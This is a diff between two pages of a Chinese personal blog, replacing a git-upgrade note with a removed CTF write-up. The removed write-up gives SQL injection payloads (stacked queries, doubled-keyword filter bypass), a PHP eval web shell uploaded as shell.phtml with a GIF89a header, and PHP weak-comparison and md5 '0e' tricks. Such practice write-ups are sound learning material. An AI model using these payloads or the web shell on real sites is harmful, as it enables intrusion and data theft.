@@ -29,25 +29,21 @@
     var NexT = window.NexT || {};
     var CONFIG = {"hostname":"haorical.xyz","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"changyan","storage":false,"lazyload":false,"nav":{"disqus":{"text":"Load Disqus","order":-1},"gitalk":{"order":-2}},"activeClass":"changyan"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":true,"preload":true}};
   </script>
-<meta name="description" content="[SUCTF 2019]EasySQL 后端语句猜测 ||绕过  sql语句 sql&#x3D;&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;  先堆叠注入，获得数据库名，表名 121;show databases;1;show tables;  直接表获取内容失败 1;desc &#96;Flag&#96;;  payload1: *,1  p">
+<meta name="description" content="步骤 因为vscode ssh要求服务器git得&gt;2,更新了个git，发现push不上去了，又把服务器搞崩了，还得重新配环境。。。  1234567891011121314151617181920212223yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidocyum install">
 <meta property="og:type" content="article">
-<meta property="og:title" content="20210904">
-<meta property="og:url" content="http://haorical.xyz/posts/fa39fd53/index.html">
+<meta property="og:title" content="git更新">
+<meta property="og:url" content="http://haorical.xyz/posts/bc46b23a/index.html">
 <meta property="og:site_name" content="中国熊猫的博客">
-<meta property="og:description" content="[SUCTF 2019]EasySQL 后端语句猜测 ||绕过  sql语句 sql&#x3D;&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;  先堆叠注入，获得数据库名，表名 121;show databases;1;show tables;  直接表获取内容失败 1;desc &#96;Flag&#96;;  payload1: *,1  p">
+<meta property="og:description" content="步骤 因为vscode ssh要求服务器git得&gt;2,更新了个git，发现push不上去了，又把服务器搞崩了，还得重新配环境。。。  1234567891011121314151617181920212223yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidocyum install">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-09-04T02:20:10.000Z">
-<meta property="article:modified_time" content="2021-09-04T08:01:58.251Z">
+<meta property="article:published_time" content="2021-11-18T15:23:34.000Z">
+<meta property="article:modified_time" content="2021-11-18T15:28:38.202Z">
 <meta property="article:author" content="Haorical">
-<meta property="article:tag" content="web">
-<meta property="article:tag" content="ctf">
-<meta property="article:tag" content="sql注入">
-<meta property="article:tag" content="文件上传">
-<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="git">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://haorical.xyz/posts/fa39fd53/">
+<link rel="canonical" href="http://haorical.xyz/posts/bc46b23a/">
 
 
 <script class="page-configurations">
@@ -59,7 +55,7 @@
     lang   : 'zh-CN'
   };
 </script>
-<title>20210904 | 中国熊猫的博客</title>
+<title>git更新 | 中国熊猫的博客</title>
   
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-MH7P85EXS0"></script>
     <script>
@@ -209,7 +205,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SUCTF-2019-EasySQL"><span class="nav-number">1.</span> <span class="nav-text">[SUCTF 2019]EasySQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BabySQL"><span class="nav-number">2.</span> <span class="nav-text">[极客大挑战 2019]BabySQL</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-Upload"><span class="nav-number">3.</span> <span class="nav-text">[极客大挑战 2019]Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#phtml-%E4%BF%AE%E6%94%B9content-type"><span class="nav-number">3.1.</span> <span class="nav-text">phtml+修改content-type</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-BackupFile"><span class="nav-number">4.</span> <span class="nav-text">[ACTF2020 新生赛]BackupFile</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-BuyFlag"><span class="nav-number">5.</span> <span class="nav-text">[极客大挑战 2019]BuyFlag</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#php%E5%BC%B1%E7%B1%BB%E5%9E%8B"><span class="nav-number">6.</span> <span class="nav-text">php弱类型</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8B%E7%BB%8D"><span class="nav-number">6.1.</span> <span class="nav-text">介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8"><span class="nav-number">6.2.</span> <span class="nav-text">利用</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A4"><span class="nav-number">1.</span> <span class="nav-text">步骤</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -291,7 +287,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/fa39fd53/">
+    <link itemprop="mainEntityOfPage" href="http://haorical.xyz/posts/bc46b23a/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpg">
@@ -304,7 +300,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          20210904
+          git更新
         </h1>
 
         <div class="post-meta-container">
@@ -316,7 +312,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2021-09-04 10:20:10 / 修改时间：16:01:58" itemprop="dateCreated datePublished" datetime="2021-09-04T10:20:10+08:00">2021-09-04</time>
+      <time title="创建时间：2021-11-18 23:23:34 / 修改时间：23:28:38" itemprop="dateCreated datePublished" datetime="2021-11-18T23:23:34+08:00">2021-11-18</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -324,12 +320,12 @@
       </span>
       <span class="post-meta-item-text">分类于</span>
         <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/" itemprop="url" rel="index"><span itemprop="name">ctf每日一题</span></a>
+          <a href="/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/" itemprop="url" rel="index"><span itemprop="name">开发工具</span></a>
         </span>
     </span>
 
   
-    <span id="/posts/fa39fd53/" class="post-meta-item leancloud_visitors" data-flag-title="20210904" title="阅读次数">
+    <span id="/posts/bc46b23a/" class="post-meta-item leancloud_visitors" data-flag-title="git更新" title="阅读次数">
       <span class="post-meta-item-icon">
         <i class="far fa-eye"></i>
       </span>
@@ -345,8 +341,8 @@
       <span class="post-meta-item-text">Changyan：</span>
     
     
-      <a title="changyan" href="/posts/fa39fd53/#SOHUCS" itemprop="discussionUrl">
-        <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="posts/fa39fd53/" itemprop="commentCount"></span>
+      <a title="changyan" href="/posts/bc46b23a/#SOHUCS" itemprop="discussionUrl">
+        <span id="changyan_count_unit" class="post-comments-count hc-comment-count" data-xid="posts/bc46b23a/" itemprop="commentCount"></span>
       </a>
     
   </span>
@@ -359,14 +355,14 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>2.1k</span>
+      <span>660</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
         <i class="far fa-clock"></i>
       </span>
       <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>4 分钟</span>
+      <span>1 分钟</span>
     </span>
 </div>
 
@@ -377,52 +373,10 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h1 id="SUCTF-2019-EasySQL"><a href="#SUCTF-2019-EasySQL" class="headerlink" title="[SUCTF 2019]EasySQL"></a>[SUCTF 2019]EasySQL</h1><blockquote>
-<p>后端语句猜测 ||绕过</p>
+        <h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><blockquote>
+<p>因为vscode ssh要求服务器git得&gt;2,更新了个git，发现push不上去了，又把服务器搞崩了，还得重新配环境。。。</p>
 </blockquote>
-<p>sql语句</p>
-<pre><code>sql=&quot;select&quot;.post[‘query’].&quot;||flag from Flag&quot;;
-</code></pre>
-<p>先堆叠注入，获得数据库名，表名</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;<span class="keyword">show</span> databases;</span><br><span class="line"><span class="number">1</span>;<span class="keyword">show</span> tables;</span><br></pre></td></tr></table></figure>
-
-<p>直接表获取内容失败</p>
-<pre><code>1;desc `Flag`;
-</code></pre>
-<p>payload1:</p>
-<pre><code>*,1
-</code></pre>
-<p>payroad2:</p>
-<pre><code>1;set sql_mode=pipes_as_concat;select 1
-</code></pre>
-<p>其中set sql_mode=pipes_as_concat;的作用为将||的作用由or变为拼接字符串</p>
-<h1 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">过滤了<span class="keyword">or</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">from</span> <span class="keyword">where</span>好多，万能密码不好用了</span><br><span class="line"></span><br><span class="line">测试后可以闭合password</span><br><span class="line"></span><br><span class="line">看显示位</span><br><span class="line">?username<span class="operator">=</span><span class="number">1</span><span class="operator">&amp;</span>password<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; uunionnion sselectelect 1,2,3# </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">获得表名，看绕过</span></span><br><span class="line"><span class="string">admin&#x27;</span> ununionion selselectect <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema<span class="operator">=</span><span class="string">&#x27;geek&#x27;</span>#</span><br><span class="line"></span><br><span class="line">获得列名</span><br><span class="line">admin<span class="string">&#x27; ununionion selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_name=&#x27;</span>b4bsql<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">爆破</span></span><br><span class="line"><span class="string">admin&#x27;</span> ununionion selselectect <span class="number">1</span>,<span class="number">2</span>,group_concat(id,username,passwoorrd) frfromom b4bsql#</span><br><span class="line"></span><br><span class="line">获得flag</span><br></pre></td></tr></table></figure>
-
-<h1 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h1><p>文件上传姿势：</p>
-<h2 id="phtml-修改content-type"><a href="#phtml-修改content-type" class="headerlink" title="phtml+修改content-type"></a>phtml+修改content-type</h2><p>phtml一般是指嵌入了php代码的html文件，但是同样也会作为php解析</p>
-<p>检查文件头，加</p>
-<pre><code>GIF89a
-</code></pre>
-<p>这个题蚁剑都没有用到，直接传个shell.phtml，然后post个cat /flag就行</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell.phtml&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a<span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">php</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h1><p>这里引入一个新的知识点:php弱类型绕过</p>
-<p>代码审计</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!is_numeric(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = intval(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>只需要让key=123即可</p>
-<h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><p>F12，代码审计，改cookie，php弱类型，科学计数法传参</p>
-<pre><code>payload: password=404a&amp;money=1e10
-</code></pre>
-<h1 id="php弱类型"><a href="#php弱类型" class="headerlink" title="php弱类型"></a>php弱类型</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>=== 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较</p>
-<p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
-<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
-<p>“0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等</p>
-<p>当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，<strong>该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为</strong>0。</p>
-<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p><strong>md5绕过：</strong></p>
-<p>md5(‘240610708’) == md5(‘QNKCDZO’)</p>
-<p>240610708 md5值为 0E462097431906509019562988736854</p>
-<p>QNKCDZO md5值为 0E830400451993494058024219903391</p>
-<p>array_search函数 类似于==</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel asciidoc</span><br><span class="line"></span><br><span class="line">yum install  gcc perl-ExtUtils-MakeMaker</span><br><span class="line"></span><br><span class="line">yum remove git</span><br><span class="line"></span><br><span class="line">cd &#x2F;usr&#x2F;local&#x2F;src&#x2F;</span><br><span class="line"></span><br><span class="line">wget https:&#x2F;&#x2F;mirrors.edge.kernel.org&#x2F;pub&#x2F;software&#x2F;scm&#x2F;git&#x2F;git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">tar -xvf git-2.23.0.tar.xz</span><br><span class="line"></span><br><span class="line">cd git-2.23.0&#x2F;</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git all</span><br><span class="line"></span><br><span class="line">make prefix&#x3D;&#x2F;usr&#x2F;local&#x2F;git install</span><br><span class="line"></span><br><span class="line">echo &quot;export PATH&#x3D;$PATH:&#x2F;usr&#x2F;local&#x2F;git&#x2F;bin&quot; &gt;&gt; &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">source &#x2F;etc&#x2F;profile</span><br><span class="line"></span><br><span class="line">git --version</span><br></pre></td></tr></table></figure>
 
     </div>
 
@@ -454,7 +408,7 @@
   </li>
   <li class="post-copyright-link">
       <strong>本文链接：</strong>
-      <a href="http://haorical.xyz/posts/fa39fd53/" title="20210904">http://haorical.xyz/posts/fa39fd53/</a>
+      <a href="http://haorical.xyz/posts/bc46b23a/" title="git更新">http://haorical.xyz/posts/bc46b23a/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -480,25 +434,18 @@
 </div>
 
           <div class="post-tags">
-              <a href="/tags/web/" rel="tag"># web</a>
-              <a href="/tags/ctf/" rel="tag"># ctf</a>
-              <a href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag"># sql注入</a>
-              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"># 文件上传</a>
-              <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag"># 代码审计</a>
+              <a href="/tags/git/" rel="tag"># git</a>
           </div>
 
         
 
           <div class="post-nav">
             <div class="post-nav-item">
-                <a href="/posts/8a5309dc/" rel="prev" title="20210901">
-                  <i class="fa fa-chevron-left"></i> 20210901
+                <a href="/posts/5c3bb6e4/" rel="prev" title="20211118">
+                  <i class="fa fa-chevron-left"></i> 20211118
                 </a>
             </div>
             <div class="post-nav-item">
-                <a href="/posts/e28ceec1/" rel="next" title="git学习">
-                  git学习 <i class="fa fa-chevron-right"></i>
-                </a>
             </div>
           </div>
     </footer>
